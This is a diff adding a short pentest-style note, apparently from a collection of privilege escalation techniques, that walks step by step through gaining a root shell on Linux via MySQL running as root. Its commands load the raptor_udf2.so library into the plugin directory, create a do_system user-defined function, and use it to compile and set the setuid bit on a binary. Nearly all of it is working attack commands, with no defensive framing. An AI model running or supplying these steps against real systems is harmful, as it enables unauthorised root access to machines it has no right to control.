@@ -1,0 +1,32 @@
+If MySQL is running as root, it is possible to craft a user defined function that executes commands with root permissions.
+This way it is possible to escalate privileges.
+
+Prequisites:
+- shell access as a normal user
+- access to mysql as root
+
+Steps:
+1. Access the database service and select the database to use.
+    mysql -u root
+    use mysql;
+2. Copy/create the raptor_udf2.so in the directory specified in the plugin_dir variable. (Normal user can't do that, therefore mysql will do it for us)
+    create table foo(line blob);
+    insert into foo values(load_file(‘/home/lowprivuser/raptor_udf2.so’));
+    select * from foo into dumpfile ‘/usr/lib/raptor_udf2.so’;
+3. Create the User Defined Function.
+    create function do_system returns integer soname ‘raptor_udf2.so’;
+    select * from mysql.func;
+4. Test that the UDF works correctly.
+    select do_system(‘id > /tmp/out; chown centos.centos /tmp/out’);
+    \! sh
+    cat /tmp/out
+5. Escalation a root-shell
+    compile setuid within mysql, this way it will be owned by root:
+        select do_system(‘gcc -o /tmp/setuid /home/lowprivuser/setuid.c’);
+    set the suid-bit on the binary, which will make the binary executable to everyone while impersonating to root
+        select do_system(‘chmod u+s /tmp/setuid’);
+    drop back to shell and execute /tmp/setuid as normal user -> this should result in a root shell.
+
+
+Source:
+https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/
